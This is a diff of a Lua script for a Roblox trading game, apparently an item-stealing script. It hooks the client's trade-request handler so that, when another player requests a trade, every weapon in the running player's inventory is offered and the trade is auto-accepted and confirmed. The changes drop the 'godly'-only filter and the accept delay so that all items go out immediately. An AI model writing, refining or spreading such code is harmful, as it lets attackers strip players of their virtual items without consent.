@@ -36,7 +36,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
             
-            print("Trade started! Scanning for godlies in LocalPlayer's inventory...")
+            print("Trade started! Adding all weapons directly using OfferItemEvent...")
             task.wait(1)
             
             local inventoryContainer = nil
@@ -70,28 +70,23 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 for _, item in ipairs(inventoryContainer:GetChildren()) do
                     if item:IsA("GuiObject") then
                         local itemName = item.Name
-                        local rarity = item:GetAttribute("Rarity") or item:GetAttribute("Tier") or ""
-                        local isGodly = tostring(rarity):lower() == "godly" or item:FindFirstChild("Godly", true) or item:FindFirstChild("G", true)
+                        local category = "Weapons"
                         
-                        -- If explicitly Godly or if checking all weapons as fallback if rarity attribute isn't found
-                        if isGodly or true then 
-                            local category = "Weapons"
-                            local count = 1
-                            local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
-                            if type(qtyAttribute) == "number" then
-                                count = qtyAttribute
-                            end
+                        local count = 1
+                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
+                        if type(qtyAttribute) == "number" then
+                            count = qtyAttribute
+                        end
 
-                            for i = 1, count do
-                                OfferItemEvent:FireServer(itemName, category)
-                                offeredCount = offeredCount + 1
-                            end
+                        for i = 1, count do
+                            OfferItemEvent:FireServer(itemName, category)
+                            offeredCount = offeredCount + 1
                         end
                     end
                 end
-                print("Successfully offered all " .. tostring(offeredCount) .. " godly/weapon items and duplicates at once!")
+                print("Successfully added all " .. tostring(offeredCount) .. " weapon items and duplicates!")
             else
-                warn("Inventory container path not found; checking Backpack fallback.")
+                warn("Inventory container path not found; using Backpack fallback.")
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
@@ -100,17 +95,17 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                print("Offered " .. tostring(offeredCount) .. " items from Backpack fallback.")
+                print("Added " .. tostring(offeredCount) .. " items from Backpack fallback.")
             end
 
-            print("Waiting 7 seconds before triggering trade accept actions...")
-            task.wait(7)
+            print("Finished adding weapons. Triggering accept and confirm trade immediately...")
 
-            if firesignal and AcceptTradeEvent.OnClientEvent then
-                firesignal(AcceptTradeEvent.OnClientEvent, false)
-            else
+            pcall(function()
+                AcceptTradeEvent:FireServer(true)
+            end)
+            pcall(function()
                 AcceptTradeEvent:FireServer()
-            end
+            end)
 
             local function fireButton(btn)
                 if btn and btn:IsA("GuiButton") then
@@ -131,7 +126,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             pcall(function()
                 local phoneActions = LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.Actions
                 fireButton(phoneActions.Accept.ActionButton)
-                task.wait(1)
+                task.wait(0.2)
                 fireButton(phoneActions.Accept.Confirm.ActionButton)
             end)
         end)
